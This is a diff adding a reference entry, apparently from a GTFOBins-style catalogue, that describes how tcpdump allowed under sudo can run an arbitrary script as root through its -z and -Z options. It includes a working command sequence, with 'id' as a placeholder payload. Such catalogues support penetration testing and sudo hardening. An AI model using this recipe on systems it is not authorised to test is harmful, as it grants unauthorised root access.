@@ -1,0 +1,9 @@
+***** Sudo *****
+If the binary is allowed to run as superuser by sudo, it does not drop the
+elevated privileges and may be used to access the file system, escalate or
+maintain privileged access.
+    * COMMAND='id'
+      TF=$(mktemp)
+      echo "$COMMAND" > $TF
+      chmod +x $TF
+      sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
